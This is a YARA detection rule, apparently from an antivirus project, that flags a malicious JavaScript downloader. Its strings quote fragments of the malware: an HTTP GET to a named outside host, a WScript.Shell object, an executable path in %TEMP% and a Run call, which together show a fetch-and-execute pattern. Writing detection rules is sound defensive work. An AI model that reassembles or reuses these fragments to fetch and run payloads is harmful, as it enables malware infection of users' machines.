rule sig_20160330_66092df7726916ce823cfef1a5ba7519 {
  meta:
    description = "datamaliciousorder - file 20160330_66092df7726916ce823cfef1a5ba7519.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ac664ef121dd71ae60872a41852958ad9419dbf2faf0000b5210c892e7450f17"

  strings:
    $s1  = "WC[ZZ](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "var CK = function B() {return WScript[H](\"WScript\"+\".Shell\");}(), TU = 11;" fullword ascii
    $s3  = "function V(NS, WW){A = A * 1; return NS - WW;};" fullword ascii
    $s4  = "if (WC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function R(){return M + \"\";};" fullword ascii
    $s6  = "function IG() {return CK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IGa6CZuwRVQWpO.ex\" + \"e\";};" fullword ascii
    $s7  = "function W(V0){CK[\"Run\"](V0, A, A);};" fullword ascii
    $s8  = "function P() {return ((X == true) && (X == H0)) ? 1 : A;};" fullword ascii
    $s9  = "var G0 = new this[\"Date\"]();" fullword ascii
    $s10 = "return V(EI, JZ);" fullword ascii
    $s11 = "function JL()" fullword ascii
    $s12 = "function OO(R0) {var TH = (1, 2, 3, 4, 5, R0); return TH;};" fullword ascii
    $s13 = "function F(){return H;};" fullword ascii
    $s14 = "function NB(){return 22;};" fullword ascii
    $s15 = "}while (W0);" fullword ascii
    $s16 = "var S = false;" fullword ascii
    $s17 = "var H0 = false;" fullword ascii
    $s18 = "H0 = true; " fullword ascii
    $s19 = "} catch(JL0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}